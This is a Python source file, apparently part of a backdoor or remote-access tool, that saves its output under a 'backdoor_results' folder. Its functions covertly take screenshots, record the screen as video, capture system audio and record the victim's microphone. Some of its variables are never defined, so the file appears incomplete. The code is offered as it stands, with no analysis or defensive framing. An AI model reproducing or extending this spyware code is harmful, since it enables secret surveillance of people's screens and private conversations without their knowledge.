import socket
import os
import subprocess
import sys
import cv2
import numpy as np
import pyautogui
import soundcard as sc
import soundfile as sf
import threading

def get_uuid():
    with open("uuid.txt", "r") as file:
        return file.read().strip()
    
def get_log_dir():
    uuid = get_uuid()
    log_dir = os.path.join("data", uuid, "backdoor_results")
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    return log_dir

log_dir = get_log_dir()

def Screenshot():
    screenshot_path = os.path.join(log_dir, "screenshot.png")
    img = pyautogui.screenshot()
    img.save(screenshot_path)
    
def Video():
    video_path = os.path.join(log_dir, "output.avi")
    out = cv2.VideoWriter(video_path, cv2.VideoWriter_fourcc(*"XVID"), fps, (tuple(pyautogui.size())))

    for i in range(int(RECORD_SEC * fps)):
        # make a screenshot
        img = pyautogui.screenshot()
        # convert these pixels to a proper numpy array to work with OpenCV
        frame = np.array(img)
        # # convert colors from BGR to RGB because opencv uses bgr by default
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        # write the frame
        out.write(frame)
        # # show the frame
        # cv2.imshow("screenshot", frame)
        # # if the user clicks q, it exits
        # if cv2.waitKey(1) == ord("q"):
        #     break

    # cv2.destroyAllWindows()
    out.release()

def Audio_Output():
    output_path = os.path.join(log_dir, "output.wav")
    output_device = sc.get_microphone(id=str(sc.default_speaker().name), include_loopback=True)
    record_audio(output_device, output_path)

def Audio_Input():
    input_path = os.path.join(log_dir, "input.wav")
    input_device = sc.get_microphone(id=str(sc.default_microphone().name))
    record_audio(input_device, input_path)

def record_audio(device, file):
    with device.recorder(samplerate=SAMPLE_RATE) as recorder:
        data = recorder.record(numframes=SAMPLE_RATE * RECORD_SEC)
    
    sf.write(file, data[:, 0], samplerate=SAMPLE_RATE)

def start_function_in_thread(function):
    thread = threading.Thread(target=function)
    thread.start()
    return thread
